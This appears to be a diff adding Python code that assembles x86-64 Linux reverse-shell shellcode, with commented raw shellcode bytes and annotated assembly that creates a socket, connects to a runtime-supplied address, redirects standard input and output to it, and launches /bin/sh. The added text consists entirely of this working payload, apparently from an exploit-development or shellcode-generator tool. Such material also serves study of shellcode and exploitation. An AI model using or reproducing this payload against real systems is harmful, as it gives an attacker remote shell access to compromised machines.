@@ -1,0 +1,47 @@
+
+#shellcode = 	b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e"
+#shellcode += 	b"\x0f\x05\x97\xb0\x2a\x48\xb9\xfe\xff\xee"
+#shellcode += 	b"\xa3\x80\xff\xff\xfe\x48\xf7\xd9\x51\x54"
+#shellcode += 	b"\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21"
+#shellcode += 	b"\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52"
+#shellcode += 	b"\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
+#shellcode += 	b"\x51\x54\x5f\x0f\x05"
+    assembly = (
+        "socket:                             "
+        "   push byte 41                    ;"      # Push/pop will set syscall num
+        "   pop rax                         ;"
+        "   cdq                             ;"      # cdq sets rdx to 0 if rax is positive
+        "   push byte 2                     ;"      # AF_INET = 2
+        "   pop rdi                         ;"
+        "   push byte 1                     ;"      # SOCK_STREAM = 1
+        "   pop rsi                         ;"
+        "   syscall                         ;"      # socket(AF_INET, SOCK_STREAM, 0)
+        "connect:                           ;"
+        "   xchg eax, edi                   ;"      # rdi is 2, so moving only al is doable
+        "   mov al, 42                      ;"
+        "   mov rcx, " + address +         ";" +    # Socket address and port
+        "   neg rcx                         ;"
+        "   push rcx                        ;"
+        "   push rsp                        ;"      # mov rsi, rsp. This it the pointer to sockaddr
+        "   pop rsi                         ;"
+        "   mov dl, 16                      ;"      # sockaddr length
+        "   syscall                         ;"      # connect(s, addr, len(addr))
+        "dup2:                              ;"
+        "   push byte 3                     ;"      # Start with 3 and decrement
+        "   pop rsi                         ;"
+        "dup2_loop:                          "      # Duplicate socket fd into stdin,
+                                                    # stdout and stderr, which fd are 0, 1 and 2
+        "   mov al, 33                      ;"      # If there is no error, rax is 0 on connect and dup2
+        "   dec esi                         ;"
+        "   syscall                         ;"      # dup2(s, rsi)
+        "   jnz dup2_loop                   ;"      # Jump when esi == 0
+        "execve:                             "
+        "   cdq                             ;"
+        "   mov al, 59                      ;"      # execve syscall is 59
+        "   push rdx                        ;"      # Put null-byte in /bin//sh
+        "   mov rcx, 0x68732f2f6e69622f     ;"      # /bin//sh
+        "   push rcx                        ;"
+        "   push rsp                        ;"      # rsp points to the top of the stack, which is occupied by /bin/sh
+        "   pop rdi                         ;"      # We use a push/pop to prevent null-byte and get a shorter shellcode
+        "   syscall                         ;"      # execve('/bin//sh', 0, 0)
+    )
